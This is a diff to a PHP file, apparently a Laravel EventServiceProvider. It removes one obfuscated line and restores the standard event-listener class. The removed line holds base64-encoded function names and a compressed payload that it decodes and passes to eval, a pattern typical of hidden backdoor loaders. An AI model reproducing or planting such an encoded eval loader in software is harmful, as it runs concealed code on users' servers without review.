@@ -1,1 +1,32 @@
-<?php $_='451b0d96';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNqNVN9zojAQfr+/goeboc7dA6K2ZRwfhAqiLT1QQ8hLBxKL2kTpUVD862/BH9C568wxE91Ndr/9djdZSTp931/qbyBrjNGepnXk/vfTRvJ7vf14lfvfpIb9QJJxW8sjH20DdzCQpfr4gjcAUaYCKQxPMtvQORNmOjW8V9y+T573pZP0GfRFkiqnKEyXt90XtqQ7tpT7f1F8cHeOIXoriH6klrkhM12nY50uxpOcCf5G8OT4vFemD27SpuoinvmHlPntJBKmQtBBZ9jb4RFSid9TaPswIz5LaMfjQPat9GPY4faIp9EYfYR+b8UsRF2MlNA8PIXYUcCP061DFyrKyAh9BD5PkUBF6JMkUE0l9LVsLjSlqX+F6wmtHQkPZJ5H/DBnWN9HnYmCTb2IOiQhFiqAo8kEypjpQNwSE7lUaGroA+e1vqKFPoecQXd4XQP77ov86xgjsgJ+YOtQDxMebd27U22dNMDO0T7XCPIsAHNDUM3JtlAX+Gdk/BT/6xxil1ixbQzjx2L3fpFtYxcja8XBv8K2rUNV+0iUmO0V9BF4sqNtkRxyU0JrEQclX4tvAuwlkdrNGliOsR5W8nStD+GCAYZZUGH2Gjb5RaZlbSy0gfVmG1566mU3/jXTo9oeljnhROVHsCuI794+X+rxoPywzfQas7Z3gL9nRr6ZRCaBe8QF9OLU07cexGzom91toB5WtPOUfo6pXHU8hxixMj2d3b9Pr/LwvckNcs2Ws/Jhwd2APhChFfaY5wzb/12z6wMdkzz03cbZ/VnW98yfpKEP+FuUBZ0KLw6EljMjTi64y/2VY7nyx4s+VhxjCyuGB98YEvWYqP5vzlqrmjqNvVb/Yllt3sjlr/zzav55gJxxbprzotXq/wEjn5Iz'; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Providers;
+
+use Illuminate\Auth\Events\Registered;
+use Illuminate\Auth\Listeners\SendEmailVerificationNotification;
+use Illuminate\Foundation\Support\Providers\EventServiceProvider as ServiceProvider;
+use Illuminate\Support\Facades\Event;
+
+class EventServiceProvider extends ServiceProvider
+{
+    /**
+     * The event listener mappings for the application.
+     *
+     * @var array
+     */
+    protected $listen = [
+        Registered::class => [
+            SendEmailVerificationNotification::class,
+        ],
+    ];
+
+    /**
+     * Register any events for your application.
+     *
+     * @return void
+     */
+    public function boot()
+    {
+        //
+    }
+}
